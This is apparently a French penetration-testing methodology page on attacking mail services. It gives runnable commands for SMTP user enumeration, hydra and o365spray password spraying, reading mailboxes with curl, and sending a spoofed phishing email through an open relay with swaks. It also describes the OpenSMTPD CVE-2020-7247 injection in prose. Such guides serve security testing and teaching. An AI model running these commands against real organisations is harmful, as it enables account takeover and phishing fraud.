# Attaquer les services de messagerie

Les services de messagerie (SMTP, POP3, IMAP) sont des cibles riches en informations : identifiants, données internes, organigrammes. L'énumération d'utilisateurs via les commandes SMTP, le brute force de boîtes mail et l'exploitation d'open relays pour le phishing sont les vecteurs d'attaque les plus courants. Les services cloud (Office 365, G-Suite) nécessitent des outils et des approches spécifiques.

## Pourquoi

La messagerie est le canal de communication principal en entreprise. Accéder à une boîte mail peut révéler des mots de passe échangés en clair, des documents confidentiels, des informations sur l'infrastructure, et des relations hiérarchiques exploitables en ingénierie sociale. De plus, les serveurs SMTP mal configurés (open relay) permettent d'envoyer des emails de phishing convaincants en usurpant des adresses internes.

## Comment ça marche

### Architecture et protocoles

Le flux d'un email suit ce parcours :

1. Le client envoie l'email au serveur SMTP (ports 25, 465, 587)
2. Le serveur SMTP transmet l'email au serveur SMTP du destinataire
3. Le destinataire récupère l'email via POP3 (110, 995) ou IMAP (143, 993)

| Port | Protocole | Usage |
|---|---|---|
| TCP/25 | SMTP | Envoi entre serveurs (non chiffré) |
| TCP/465 | SMTPS | Envoi chiffré (SSL/TLS implicite) |
| TCP/587 | SMTP | Envoi chiffré (STARTTLS) |
| TCP/110 | POP3 | Réception (non chiffré) |
| TCP/143 | IMAP | Réception (non chiffré) |
| TCP/993 | IMAPS | Réception chiffrée (IMAP) |
| TCP/995 | POP3S | Réception chiffrée (POP3) |

### Identification du service mail

Déterminer si le service est hébergé en interne ou dans le cloud avant de choisir l'approche d'attaque :

```bash
# - Identifier le serveur mail via les enregistrements MX
host -t MX domaine.com
dig mx domaine.com
```

Les réponses typiques :
- `aspmx.l.google.com` : Google Workspace (G-Suite)
- `mail.protection.outlook.com` : Microsoft 365
- `mx.zoho.com` : Zoho Mail
- `mail1.domaine.com` : serveur interne custom

### Énumération

```bash
# - Scan des ports de messagerie
nmap -Pn -sCV -p25,110,143,465,587,993,995 <IP_CIBLE>
```

### Énumération d'utilisateurs SMTP

SMTP offre des commandes qui permettent de vérifier l'existence d'adresses email :

{% tabs %}
{% tab title="VRFY" %}
```bash
# - Vérifier un utilisateur avec VRFY
telnet <IP_CIBLE> 25

VRFY root
252 2.0.0 root          # - utilisateur existe

VRFY inexistant
550 5.1.1 <inexistant>: Recipient address rejected
```

`VRFY` vérifie directement si un nom d'utilisateur existe sur le serveur.
{% endtab %}
{% tab title="EXPN" %}
```bash
# - Développer une liste de distribution avec EXPN
telnet <IP_CIBLE> 25

EXPN support-team
250 2.0.0 alice@domaine.com
250 2.1.5 bob@domaine.com
```

`EXPN` est plus puissant que `VRFY` : sur une liste de distribution, il retourne tous les membres.
{% endtab %}
{% tab title="RCPT TO" %}
```bash
# - Énumérer via RCPT TO
telnet <IP_CIBLE> 25

MAIL FROM:test@test.com
250 OK

RCPT TO:alice
250 2.1.5 alice... Recipient ok

RCPT TO:inexistant
550 5.1.1 inexistant... User unknown
```

`RCPT TO` est la méthode la plus fiable car elle est rarement désactivée (nécessaire pour le fonctionnement normal du serveur).
{% endtab %}
{% endtabs %}

**Automatisation avec smtp-user-enum :**

```bash
# - Énumération automatisée
smtp-user-enum -M RCPT -U utilisateurs.txt -D domaine.htb -t <IP_CIBLE>
```

{% hint style="info" %}
POP3 permet aussi de vérifier l'existence d'un utilisateur. La commande `USER` suivie du nom d'utilisateur retourne `+OK` si le compte existe, `-ERR` sinon. Tester sur le port 110.
{% endhint %}

### Énumération cloud (Office 365)

Les services cloud ne supportent pas les commandes SMTP classiques pour l'énumération. Des outils spécialisés exploitent les particularités de chaque fournisseur :

```bash
# - Vérifier qu'un domaine utilise Office 365
python3 o365spray.py --validate --domain domaine.com

# - Énumérer les utilisateurs sur O365
python3 o365spray.py --enum -U utilisateurs.txt --domain domaine.com
```

### Attaques par mot de passe

{% tabs %}
{% tab title="Hydra (POP3)" %}
```bash
# - Password spray sur POP3
hydra -L utilisateurs.txt -p 'MotDePasse123!' -f <IP_CIBLE> pop3
```
{% endtab %}
{% tab title="Hydra (SMTP)" %}
```bash
# - Password spray sur SMTP
hydra -l utilisateur@domaine.htb -P mots_de_passe.txt \
    -s 587 smtp://<IP_CIBLE>
```
{% endtab %}
{% tab title="O365 spray" %}
```bash
# - Password spray sur Office 365
python3 o365spray.py --spray -U utilisateurs.txt -p 'Saison2024!' \
    --count 1 --lockout 1 --domain domaine.com
```

O365spray gère automatiquement le throttling et le verrouillage de compte.
{% endtab %}
{% endtabs %}

### Accès aux boîtes mail

Une fois les identifiants obtenus, récupérer les emails :

```bash
# - Lire les emails via POP3 avec curl
curl pop3://<IP_CIBLE>/1 -u 'utilisateur@domaine.htb:MotDePasse'

# - Lister les messages via IMAP
curl imap://<IP_CIBLE> -u 'utilisateur:MotDePasse'
```

### Open Relay

Un serveur SMTP en open relay accepte de transmettre des emails sans authentification, permettant d'envoyer des mails en usurpant n'importe quelle adresse d'expéditeur.

```bash
# - Détecter un open relay
nmap -p25 -Pn --script smtp-open-relay <IP_CIBLE>

# - Envoyer un email via un open relay (avec swaks)
swaks --from direction@domaine.com --to cible@domaine.com \
    --header 'Subject: Mise à jour de sécurité' \
    --body 'Veuillez mettre à jour vos identifiants : http://faux-lien.com/' \
    --server <IP_CIBLE>
```

{% hint style="danger" %}
Un open relay combiné à une adresse d'expéditeur interne crédible est un vecteur de phishing extrêmement efficace. Le destinataire voit un email provenant d'un collègue ou de la direction, envoyé depuis le serveur mail légitime de l'entreprise.
{% endhint %}

### OpenSMTPD : CVE-2020-7247

Cette vulnérabilité dans OpenSMTPD (versions jusqu'à 6.6.2) permet un RCE sans authentification. L'exploit injecte une commande système dans le champ d'adresse de l'expéditeur, en utilisant un point-virgule comme séparateur. La commande est limitée à 64 caractères.

Le service SMTP écoute avec les droits `root` pour pouvoir se binder sur le port 25, ce qui signifie que la commande injectée s'exécute avec les privilèges les plus élevés.

## En pratique

```bash
# 1 - Identifier le type de service mail
host -t MX domaine.com

# 2 - Scanner les ports de messagerie
nmap -Pn -sCV -p25,110,143,465,587,993,995 <IP_CIBLE>

# 3 - Énumérer les utilisateurs SMTP
smtp-user-enum -M RCPT -U utilisateurs.txt -D domaine.htb -t <IP_CIBLE>

# 4 - Password spray
hydra -l utilisateur@domaine.htb -P passwords.txt -s 587 smtp://<IP_CIBLE>

# 5 - Lire les emails obtenus
curl pop3://<IP_CIBLE>/1 -u 'utilisateur:pass'

# 6 - Tester l'open relay
nmap -p25 --script smtp-open-relay <IP_CIBLE>
```

## Pièges et galères

{% tabs %}
{% tab title="Énumération" %}
- **VRFY désactivé** : beaucoup de serveurs modernes désactivent VRFY. Basculer sur RCPT TO qui est rarement bloqué
- **Réponses ambiguës** : certains serveurs retournent le même code de réponse que l'utilisateur existe ou non (pour contrer l'énumération). Comparer avec des noms clairement invalides pour calibrer
- **Rate limiting** : les serveurs mail appliquent souvent un throttling agressif. Adapter le nombre de threads et le délai entre les requêtes
{% endtab %}
{% tab title="Cloud" %}
- **MFA** : même avec un mot de passe valide, l'authentification multi-facteurs bloque l'accès sur O365 et G-Suite. Les outils comme o365spray détectent ce cas
- **Conditional Access** : les politiques Azure AD peuvent bloquer les connexions depuis des IP non approuvées
- **Outils obsolètes** : les outils d'énumération cloud doivent être régulièrement mis à jour car les fournisseurs changent leurs API
{% endtab %}
{% tab title="Open relay" %}
- **SPF / DKIM / DMARC** : même avec un open relay, les emails usurpés seront marqués comme spam si le domaine a des enregistrements SPF et DMARC bien configurés. Vérifier ces enregistrements avant de tenter le phishing
- **Logs** : l'envoi via un open relay laisse des traces dans les logs du serveur avec l'IP de l'attaquant
{% endtab %}
{% endtabs %}

## Retour terrain

L'énumération d'utilisateurs SMTP est souvent le premier pas pour constituer une liste de comptes à cibler en password spray sur d'autres services (SMB, RDP, VPN). La méthode RCPT TO est la plus fiable et la plus discrète.

Les open relays sont rares sur les serveurs modernes, mais on les trouve encore sur du matériel legacy (copieurs multifonctions, systèmes embarqués) et des serveurs internes configurés à la va-vite.

Pour O365, les outils comme o365spray et MailSniper sont indispensables. Le spray doit être particulièrement prudent car Microsoft détecte et bloque les tentatives massives, et les comptes verrouillés génèrent des alertes auprès de l'équipe sécurité du client.

## Mémo express

| Technique | Outil / Commande | Prérequis |
|---|---|---|
| Enum MX | `host -t MX`, `dig mx` | Nom de domaine |
| Enum utilisateurs | `smtp-user-enum -M RCPT` | Port SMTP ouvert |
| Enum O365 | `o365spray --enum` | Domaine sur O365 |
| Password spray | `hydra`, `o365spray --spray` | Liste d'utilisateurs |
| Lecture mail | `curl pop3://` ou `imap://` | Identifiants valides |
| Open relay | `nmap --script smtp-open-relay` | Port 25 ouvert |
| Phishing | `swaks --from --to --server` | Open relay confirmé |
| CVE-2020-7247 | Exploit OpenSMTPD | OpenSMTPD <= 6.6.2 |

***
